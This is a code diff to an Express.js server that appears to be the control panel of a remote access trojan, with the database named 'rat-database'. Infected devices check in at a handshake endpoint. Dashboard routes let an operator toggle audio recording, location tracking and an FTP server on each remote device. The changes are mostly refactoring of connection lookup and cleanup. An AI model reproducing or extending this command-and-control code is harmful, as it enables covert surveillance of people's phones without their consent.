@@ -12,11 +12,8 @@ var app = express();
 var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"
 
 // connect to the database
-// mongoose.connect('mongodb://localhost/dagstaatje-database');
+// mongoose.connect('mongodb://localhost/rat-database');
 // var Dagstaat = require('./schemas/dagstaat');
-//
-// TODO list all connections
-// have actions next to each one to turn on and off stuff
 //
 
 app.use(morgan(':date[clf] :remote-addr :method :url :res[content-length] - :response-time ms'));
@@ -28,7 +25,7 @@ app.post('/handshake/:id/:version/:package/:ssid/:isAudioStarted/:isLocationStar
 					req.params.isAudioStarted, req.params.ftpServerStarted,
 					req.params.location);
 
-			var connection = connectionManager.getOneById(req.params.id);
+			var connection = connectionManager.getLastById(req.params.id);
 			var actions = {
 				startAudio    : connection.audio,
 				startLocation : connection.locationStarted,
@@ -90,7 +87,7 @@ app.get('/dashboard', function(req, res) {
 
 app.get('/detailView/:id', function (req, res) {
 	var head = "<html> <head> </head> <body> ";
-	var connection = connectionManager.getOneById(req.params.id);
+	var connection = connectionManager.getLastById(req.params.id);
 	var content = connection;
 	var foot = "\r\n</body> </html>";
 	var page = head + content + foot;
@@ -98,7 +95,7 @@ app.get('/detailView/:id', function (req, res) {
 });
 
 app.get('/toggleFtpServer/:id', function (req, res) {
-	var connection = connectionManager.getOneById(req.params.id);
+	var connection = connectionManager.getLastById(req.params.id);
 	if(connection.ftpServ === true || connection.ftpServ === "true"){
 		connection.ftpServ = false;
 	} else {
@@ -108,7 +105,7 @@ app.get('/toggleFtpServer/:id', function (req, res) {
 });
 
 app.get('/toggleLocation/:id', function (req, res) {
-	var connection = connectionManager.getOneById(req.params.id);
+	var connection = connectionManager.getLastById(req.params.id);
 	if(connection.locationStarted === true || connection.locationStarted === "true"){
 		connection.locationStarted = false;
 	} else {
@@ -118,7 +115,7 @@ app.get('/toggleLocation/:id', function (req, res) {
 });
 
 app.get('/toggleAudio/:id', function (req, res) {
-	var connection = connectionManager.getOneById(req.params.id);
+	var connection = connectionManager.getLastById(req.params.id);
 	if(connection.audio === true || connection.audio === "true"){
 		connection.audio = false;
 	} else {
@@ -130,7 +127,7 @@ app.get('/toggleAudio/:id', function (req, res) {
 var connectionManager = {
 	connections: [],
 	add: function(id, locationStarted, audio, ftpServ, location){
-		if(this.getOneById(id) === undefined){
+		if(this.getLastById(id) === undefined){
 			this.connections.push( {
 				id: id,
 				age: Date.now(),
@@ -139,8 +136,10 @@ var connectionManager = {
 				ftpServ: ftpServ,
 				location: location
 			});
+		} else {
+			this.getLastById(id).age = Date.now();
 		}
-		this.clean();
+		// this.clean();
 	},
 	clean: function(){
 		var timeout = 60000;
@@ -151,8 +150,8 @@ var connectionManager = {
 			}
 		}
 	},
-	getOneById: function(id){
-		for(var i = 0; i < this.connections.length; i++){
+	getLastById: function(id){
+		for(var i = this.connections.length - 1; i >= 0; i--){
 			if(this.connections[i].id === id) {
 				return this.connections[i];
 			}
